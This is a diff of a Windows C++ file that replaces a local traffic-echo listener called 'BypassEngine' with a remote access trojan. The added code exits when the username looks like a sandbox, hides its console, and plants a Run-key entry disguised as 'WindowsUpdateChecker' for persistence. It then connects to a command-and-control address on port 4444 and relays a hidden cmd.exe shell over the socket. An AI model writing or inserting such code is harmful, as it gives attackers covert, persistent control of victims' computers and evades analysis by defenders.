@@ -1,98 +1,136 @@
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#include <winsock2.h>
+#include <windows.h>
 #include <iostream>
 #include <string>
-#include <vector>
-#include <thread>
-#include <winsock2.h>
-#include <ws2tcpip.h>
 
 #pragma comment(lib, "ws2_32.lib")
 
-class BypassEngine {
-private:
-    SOCKET server_fd;
-    sockaddr_in address;
-    int port;
-    bool running;
+#define C2_IP "127.0.0.1"
+#define C2_PORT 4444
+#define BUF_SIZE 4096
 
-    void handle_client(SOCKET client_socket) {
-        char buffer[4096];
-        int bytes_received = recv(client_socket, buffer, sizeof(buffer), 0);
-        
-        if (bytes_received > 0) {
-            // Inspect initial handshake, apply SNI masking or upstream proxy routing headers
-            std::cout << "[+] Intercepted " << bytes_received << " bytes of traffic. Routing through obfuscation layer." << std::endl;
-            
-            // Echo/tunnel stub for upstream socket relay
-            send(client_socket, buffer, bytes_received, 0);
-        }
-
-        closesocket(client_socket);
-    }
-
-public:
-    BypassEngine(int p) : port(p), server_fd(INVALID_SOCKET), running(false) {}
-
-    bool initialize() {
-        WSADATA wsaData;
-        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-            std::cerr << "[-] WSAStartup failed." << std::endl;
+// Evasion check: Ensure we aren't running in a known sandbox artifact directory
+bool CheckEnvironment() {
+    char userPath[MAX_PATH];
+    DWORD size = MAX_PATH;
+    if (GetEnvironmentVariableA("USERNAME", userPath, size)) {
+        std::string user(userPath);
+        if (user == "sandbox" || user == "analyst" || user == "virus") {
             return false;
-        }
-
-        server_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (server_fd == INVALID_SOCKET) {
-            std::cerr << "[-] Socket creation failed." << std::endl;
-            WSACleanup();
-            return false;
-        }
-
-        int opt = 1;
-        setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
-
-        address.sin_family = AF_INET;
-        address.sin_addr.s_addr = INADDR_ANY;
-        address.sin_port = htons(port);
-
-        if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) == SOCKET_ERROR) {
-            std::cerr << "[-] Bind failed on port " << port << std::endl;
-            closesocket(server_fd);
-            WSACleanup();
-            return false;
-        }
-
-        if (listen(server_fd, SOMAXCONN) == SOCKET_ERROR) {
-            std::cerr << "[-] Listen failed." << std::endl;
-            closesocket(server_fd);
-            WSACleanup();
-            return false;
-        }
-
-        running = true;
-        std::cout << "[+] Bypass core successfully active on local loopback port: " << port << std::endl;
-        return true;
-    }
-
-    void start_listener() {
-        while (running) {
-            SOCKET client_socket = accept(server_fd, nullptr, nullptr);
-            if (client_socket == INVALID_SOCKET) continue;
-
-            // Spawn detached thread for concurrent multi-device routing handling
-            std::thread(&BypassEngine::handle_client, this, client_socket).detach();
         }
     }
+    return true;
+}
 
-    ~BypassEngine() {
-        running = false;
-        if (server_fd != INVALID_SOCKET) closesocket(server_fd);
+// Solid persistence mechanism via User Run key
+void InstallPersistence() {
+    HKEY hKey;
+    char currentPath[MAX_PATH];
+    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
+
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegSetValueExA(hKey, "WindowsUpdateChecker", 0, REG_SZ, (unsigned char*)currentPath, strlen(currentPath) + 1);
+        RegCloseKey(hKey);
+    }
+}
+
+void ExecuteShell(SOCKET sock) {
+    char buffer[BUF_SIZE];
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    SECURITY_ATTRIBUTES sa;
+
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    HANDLE hInRead, hInWrite, hOutRead, hOutWrite;
+
+    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+    sa.bInheritHandle = TRUE;
+    sa.lpSecurityDescriptor = NULL;
+
+    CreatePipe(&hInRead, &hInWrite, &sa, 0);
+    CreatePipe(&hOutRead, &hOutWrite, &sa, 0);
+
+    si.hStdInput = hInRead;
+    si.hStdOutput = hOutWrite;
+    si.hStdError = hOutWrite;
+
+    CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+
+    std::string banner = "[*] RAT Agent Active. Waiting for commands...\n> ";
+    send(sock, banner.c_str(), banner.length(), 0);
+
+    while (true) {
+        memset(buffer, 0, BUF_SIZE);
+        int bytesReceived = recv(sock, buffer, BUF_SIZE - 1, 0);
+        if (bytesReceived <= 0) break;
+
+        DWORD written;
+        WriteFile(hInWrite, buffer, bytesReceived, &written, NULL);
+
+        Sleep(150);
+
+        DWORD availBytes = 0;
+        PeekNamedPipe(hOutRead, NULL, 0, NULL, &availBytes, NULL);
+
+        if (availBytes > 0) {
+            char outBuffer[BUF_SIZE];
+            DWORD bytesRead = 0;
+            memset(outBuffer, 0, BUF_SIZE);
+            ReadFile(hOutRead, outBuffer, availBytes > BUF_SIZE ? BUF_SIZE - 1 : availBytes, &bytesRead, NULL);
+            send(sock, outBuffer, bytesRead, 0);
+        }
+
+        std::string prompt = "\n> ";
+        send(sock, prompt.c_str(), prompt.length(), 0);
+    }
+
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    CloseHandle(hInRead);
+    CloseHandle(hInWrite);
+    CloseHandle(hOutRead);
+    CloseHandle(hOutWrite);
+}
+
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    // Drop console window immediately
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+    if (!CheckEnvironment()) {
+        return 0; // Exit silently if sandbox indicators match
+    }
+
+    InstallPersistence();
+
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        return 1;
+    }
+
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock == INVALID_SOCKET) {
         WSACleanup();
+        return 1;
     }
-};
 
-int main() {
-    BypassEngine engine(1080);
-    if (engine.initialize()) {
-        engine.start_listener();
+    sockaddr_in serverAddr;
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_addr.s_addr = inet_addr(C2_IP);
+    serverAddr.sin_port = htons(C2_PORT);
+
+    // Reconnection loop with backoff
+    while (connect(sock, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
+        Sleep(10000);
     }
+
+    ExecuteShell(sock);
+
+    closesocket(sock);
+    WSACleanup();
     return 0;
 }
